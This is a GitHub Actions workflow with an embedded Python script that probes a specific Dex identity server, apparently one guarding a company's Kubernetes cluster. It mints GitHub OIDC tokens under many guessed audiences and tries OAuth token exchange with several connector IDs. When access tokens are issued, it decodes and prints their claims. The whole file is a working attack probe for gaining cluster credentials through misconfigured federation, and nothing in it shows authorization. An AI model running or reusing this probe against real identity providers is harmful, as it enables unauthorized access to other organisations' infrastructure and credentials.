name: oidc-dex-probe
on: [push, workflow_dispatch]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: probe dex token exchange with real GH OIDC token
        env:
          DEX: https://dex.3209e979-k8s.cloud.together.ai
        run: |
          python3 - <<'PY'
          import json, os, base64, urllib.request, urllib.parse, urllib.error

          DEX = os.environ["DEX"]
          req_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
          req_tok = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]

          def get_gh_token(aud):
              u = req_url + "&audience=" + urllib.parse.quote(aud)
              r = urllib.request.Request(u)
              r.add_header("Authorization", "bearer " + req_tok)
              with urllib.request.urlopen(r) as resp:
                  return json.loads(resp.read())["value"]

          def dec(t):
              parts = t.split(".")
              if len(parts) != 3:
                  return {}
              def d(s):
                  return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
              return {"hdr": d(parts[0]), "payload": d(parts[1])}

          def post_form(url, form):
              data = urllib.parse.urlencode(form).encode()
              r = urllib.request.Request(url, data=data, method="POST")
              r.add_header("Content-Type", "application/x-www-form-urlencoded")
              try:
                  with urllib.request.urlopen(r) as resp:
                      return resp.status, resp.read().decode()
              except urllib.error.HTTPError as e:
                  return e.code, e.read().decode()

          for aud in ["https://dex.3209e979-k8s.cloud.together.ai", "together", "together-ai",
                      "kubernetes", "together-cli", "dex", "https://api.together.ai",
                      "sts.together.ai", "https://together.ai"]:
              try:
                  tok = get_gh_token(aud)
              except Exception as e:
                  print("AUD %s: gh token error %s" % (aud, e))
                  continue
              info = dec(tok)
              p = info.get("payload", {})
              print("===== AUD=%s len=%d" % (aud, len(tok)))
              print("  GH hdr=%s" % json.dumps(info.get("hdr", {})))
              print("  GH iss=%s sub=%s aud=%s owner=%s" % (p.get("iss"), p.get("sub"), p.get("aud"), p.get("repository_owner")))
              for cid in ["github-actions", "cursor-cloud", "okta"]:
                  st, body = post_form(DEX + "/token", {
                      "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
                      "subject_token": tok,
                      "subject_token_type": "urn:ietf:params:oauth:token-type:id_token",
                      "client_id": "kubernetes",
                      "connector_id": cid,
                  })
                  print("  Dex[%s] HTTP %s: %s" % (cid, st, body[:200]))
                  if '"access_token"' in body:
                      print("  !!! TOKEN ISSUED connector=%s aud=%s" % (cid, aud))
                      try:
                          j = json.loads(body)
                          claims = dec(j.get("access_token", ""))
                          print("  DEX hdr=%s" % json.dumps(claims.get("hdr", {})))
                          print("  DEX claims=%s" % json.dumps(claims.get("payload", {})))
                      except Exception as e:
                          print("  decode err %s" % e)
          print("PROBE DONE")
          PY
